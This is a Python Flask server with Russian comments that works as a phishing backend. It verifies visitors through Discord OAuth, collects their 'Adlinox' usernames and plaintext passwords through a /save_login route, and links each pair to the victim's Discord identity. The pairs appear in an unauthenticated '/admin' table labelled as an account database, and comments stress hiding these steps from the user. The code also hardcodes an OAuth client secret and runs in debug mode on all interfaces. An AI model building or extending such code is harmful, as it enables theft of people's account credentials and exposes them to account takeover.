import os
import requests
from flask import Flask, request, redirect, jsonify, session
from flask_cors import CORS

app = Flask(__name__)
app.secret_key = "adlinox_secret_key_123"
CORS(app, supports_credentials=True)

# Твои данные Discord
CLIENT_ID = "1566038103762796584"
CLIENT_SECRET = "JJ3Y2rGsKvoe1Cl_0DaiKNeqXDKbY4FF"
REDIRECT_URI = "http://127.0.0.1:5000/callback"

# Временное хранилище для админки
logs = []

# 1. Перенаправление в Discord (невидимо для пользователя)
@app.route('/login')
def login():
    return redirect(f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify")

# 2. Discord возвращает код сюда. Мы меняем его на данные.
@app.route('/callback')
def callback():
    code = request.args.get('code')
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    # Получаем токен
    r = requests.post('https://discord.com/api/oauth2/token', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
    token = r.json().get('access_token')
    
    # Получаем ник и ID
    user_req = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f'Bearer {token}'})
    user = user_req.json()
    
    # Сохраняем в сессию (скрыто от глаз)
    session['d_name'] = user['username']
    session['d_id'] = user['id']
    session['d_avatar'] = f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png"

    # Возвращаем на HTML с невидимым флагом успеха
    return redirect(f"http://127.0.0.1:5000/index.html?success=true")

# 3. HTML спрашивает: "Кто там зашел?" — сервер отдает данные
@app.route('/get_discord_info')
def get_info():
    if 'd_id' in session:
        return jsonify({"verified": True, "name": session['d_name'], "id": session['d_id'], "avatar": session['d_avatar']})
    return jsonify({"verified": False})

# 4. HTML отправляет логин/пароль — сервер сохраняет связку
@app.route('/save_login', methods=['POST'])
def save_login():
    data = request.json
    logs.append({
        "adlinox_user": data.get('username'),
        "adlinox_pass": data.get('password'),
        "discord_name": session.get('d_name', 'Unknown'),
        "discord_id": session.get('d_id', 'Unknown')
    })
    return jsonify({"success": True})

# 5. Твоя секретная админка (открывается по ссылке)
@app.route('/admin')
def admin():
    return f"""
    <html><head><style>
    body {{ background: #111; color: #fff; font-family: Arial; padding: 20px; }}
    h2 {{ color: #E2242A; }} table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
    th, td {{ border: 1px solid #333; padding: 12px; text-align: left; }} th {{ background: #222; color: #E2242A; }}
    </style></head><body>
    <h2>👑 База Аккаунтов</h2>
    <table><tr><th>Логин Adlinox</th><th>Пароль</th><th>Ник Discord</th><th>ID Discord</th></tr>
    {''.join([f"<tr><td>{l['adlinox_user']}</td><td>{l['adlinox_pass']}</td><td>{l['discord_name']}</td><td>{l['discord_id']}</td></tr>" for l in logs])}
    </table></body></html>
    """

if __name__ == '__main__':
    # Слушаем 0.0.0.0, чтобы работало и на телефоне, и на ПК
    app.run(host='0.0.0.0', port=5000, debug=True)
